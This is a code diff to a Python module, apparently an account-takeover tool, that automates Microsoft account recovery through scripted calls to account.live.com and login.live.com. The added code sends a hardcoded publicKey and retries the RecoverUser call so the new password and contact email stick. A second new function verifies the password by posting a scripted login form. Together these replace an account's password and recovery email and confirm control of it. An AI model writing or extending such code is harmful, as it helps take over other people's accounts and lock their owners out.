@@ -1,10 +1,95 @@
 from securing.utils.cookies.get_email_code import get_email_code
+from securing.utils.cookies.get_livedata import livedata
 from urllib.parse import unquote
+import asyncio
 import logging
 import codecs
 import httpx
 import json
 import re
+
+
+async def verify_password_works(session: httpx.AsyncClient, email: str, password: str) -> str:
+    """Check whether Microsoft accepted the new password.
+
+    Returns: "ok" | "bad" | "unknown"
+    Uses a fresh login page PPFT (not GetCredentialType FlowToken) to avoid
+    false "incorrect password" pages from malformed login posts.
+    """
+    try:
+        # Password can take a moment to propagate after RecoverUser
+        await asyncio.sleep(2.0)
+
+        live = await livedata(session)
+        check = await session.post(
+            url=live["urlPost"],
+            headers={
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Origin": "https://login.live.com",
+                "Referer": "https://login.live.com/",
+            },
+            data={
+                "login": email,
+                "loginfmt": email,
+                "passwd": password,
+                "PPFT": live["ppft"],
+                "type": "11",
+                "LoginOptions": "3",
+                "ps": "2",
+                "psRNGCDefaultType": "",
+                "psRNGCEntropy": "",
+                "psRNGCSLK": "",
+                "canary": "",
+                "ctx": "",
+                "hpgrequestid": "",
+                "PPSX": "Passpor",
+                "NewUser": "1",
+                "FoundMSAs": "",
+                "fspost": "0",
+                "i21": "0",
+                "CookieDisclosure": "0",
+                "IsFidoSupported": "0",
+            },
+            follow_redirects=False,
+        )
+        text = check.text or ""
+        lower = text.lower()
+
+        # Explicit wrong-password markers only
+        hard_bad = (
+            "that password is incorrect" in lower
+            or "your account or password is incorrect" in lower
+            or '"serrorcode":"80041012"' in lower
+            or "serrorcode\\\":\\\"80041012" in lower
+        )
+        if hard_bad:
+            logging.error(
+                "Password verify BAD for %s (status=%s snippet=%s)",
+                email,
+                check.status_code,
+                text[:300].replace("\n", " "),
+            )
+            return "bad"
+
+        if (
+            check.status_code in (302, 303)
+            or "__Host-MSAAUTH" in session.cookies
+            or "urlPost" in text
+            or "account.live.com" in (check.headers.get("location") or "")
+        ):
+            logging.info("Password verify OK for %s (status=%s)", email, check.status_code)
+            return "ok"
+
+        logging.warning(
+            "Password verify UNKNOWN for %s (status=%s snippet=%s)",
+            email,
+            check.status_code,
+            text[:300].replace("\n", " "),
+        )
+        return "unknown"
+    except Exception:
+        logging.exception("Password verify crashed for %s", email)
+        return "unknown"
 
 MS_HEADERS = {
     "Content-type": "application/json; charset=utf-8",
@@ -124,22 +209,76 @@ async def recover(session: httpx.AsyncClient, email: str, recovery_code: str, ne
 
     canary = verifyCodeResponseJson["apiCanary"]
 
-    finishSecure = await session.post(
-        url = "https://account.live.com/API/Recovery/RecoverUser",
-        headers = {
-            **MS_HEADERS,
-            "canary": canary,
-        },
-        json = {
-            "contactEmail": new_email,
-            "contactEpid": "",
-            "password": new_password,
-            "passwordExpiryEnabled": 0,
-            "token": token,
-        }
+    # publicKey is required by RecoverUser for the password to actually stick.
+    # Without it, MS often still returns recoveryCode + applies contactEmail,
+    # but leaves the old password unchanged. Value from working MSA recovery clients.
+    public_key = (
+        verifyCodeResponseJson.get("publicKey")
+        or recJson.get("publicKey")
+        or "25CE4D96CB3A09A69CD847C69FC6D40AF4A4DE12"
     )
-    finishJson = _parse_json(finishSecure, "RecoverUser")
-    if finishJson and "recoveryCode" in finishJson:
-        return finishJson["recoveryCode"]
 
+    recover_payload = {
+        "contactEmail": new_email,
+        "contactEpid": "",
+        "password": new_password,
+        "passwordExpiryEnabled": 0,
+        "publicKey": public_key,
+        "token": token,
+    }
+
+    finishJson = None
+    for attempt in range(1, 4):
+        finishSecure = await session.post(
+            url="https://account.live.com/API/Recovery/RecoverUser",
+            headers={
+                **MS_HEADERS,
+                "canary": canary,
+            },
+            json=recover_payload,
+        )
+        logging.info(
+            "RecoverUser attempt %s status=%s body=%s",
+            attempt,
+            finishSecure.status_code,
+            finishSecure.text[:800],
+        )
+
+        # Don't use _parse_json here — it drops responses that include an error
+        # key even when recoveryCode is present.
+        try:
+            finishJson = finishSecure.json() if finishSecure.text.strip() else None
+        except json.JSONDecodeError:
+            finishJson = None
+
+        if not finishJson:
+            if attempt < 3:
+                await asyncio.sleep(attempt * 2)
+                continue
+            return None
+
+        err = finishJson.get("error") or {}
+        err_code = str(err.get("code", ""))
+        if err_code == "6001":
+            logging.error("RecoverUser rate-limited (6001) for %s", email)
+            return None
+        if err_code:
+            err_msg = str(err.get("data", err.get("message", ""))).lower()
+            if any(k in err_msg or k in err_code.lower() for k in ("password", "passwd", "complexity", "banned")):
+                logging.error("RecoverUser rejected password: %s", err)
+                return None
+            logging.error("RecoverUser error: %s", err)
+            if attempt < 3:
+                await asyncio.sleep(attempt * 2)
+                continue
+            return None
+
+        if finishJson.get("recoveryCode"):
+            print(f"[+] - RecoverUser OK (password length={len(new_password)})")
+            return finishJson["recoveryCode"]
+
+        if attempt < 3:
+            await asyncio.sleep(attempt * 2)
+
+    logging.error("RecoverUser missing recoveryCode after retries: %s", finishJson)
     return None
